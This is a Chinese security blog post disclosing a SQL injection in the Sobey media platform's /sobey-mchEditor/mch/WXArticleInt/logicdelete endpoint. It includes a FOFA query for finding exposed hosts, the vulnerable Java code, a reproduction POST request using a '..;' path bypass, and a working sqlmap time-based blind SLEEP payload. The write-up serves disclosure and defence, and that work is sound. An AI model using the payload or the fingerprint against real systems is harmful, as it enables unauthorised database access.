---
title: "索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/logicdelete SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-WXArticleInt-logicdelete-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditormchwxarticleintlogicdelete-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/logicdelete SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/29 08:18
- 579浏览
- [0评论](#comment)
- 15分钟阅读

深入探索

漏洞扫描服务

安全研究工具

VPN服务

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/mch/WXArticleInt/logicdelete 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入防护

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

根据漏洞信息看下`mch/WXArticleInt/logicdelete`的实现逻辑

```
@RequestMapping(
    value = {"/logicdelete"},
    method = {RequestMethod.POST}
)
public Response logicDelete(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam("id") String id) {
    JSONObject userinfo = (JSONObject)this.req.getAttribute("userinfo");
    Response response = new Response();
    response.setStatus(200);
    response.setMessage(this.enTips("wxarticle.logicdelete.success", "删除成功！"));
    response.setData("");
    if (StringUtils.isEmpty(id)) {
        return response;
    } else {
        try {
            id.replaceAll("^,|,$", "");
            QueryBuilder qb = new QueryBuilder("update zcnwxarticle SET ifval='0' where id IN(" + id + ")");
            qb.executeNoQuery();
```

深入探索

在线安全工具

云安全解决方案

安全研究报告

代码一看就很明了了，**id**是被直接拼接在in子语句中，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /sobey-mchEditor/js/..;/mch/WXArticleInt/logicdelete HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/x-www-form-urlencoded

siteCode=&id=SQLI_POC&token=
```

[![索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/logicdelete SQL注入漏洞](images/img-001-3b7f7a393850.webp)](https://image.mrxn.net/4cd340469acd4cc4819091fa4297ae23.webp)

成功延时 5 秒

代码安全审计

深入探索

服务器安全服务

数据库

网络安全培训

[sqlmap](https://mrxn.net/tag/sqlmap)结果如下

```
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: siteCode=&id=1 AND (SELECT 2804 FROM (SELECT(SLEEP(5)))MDfc)&token=
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#sqlmap](https://mrxn.net/tag/sqlmap)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
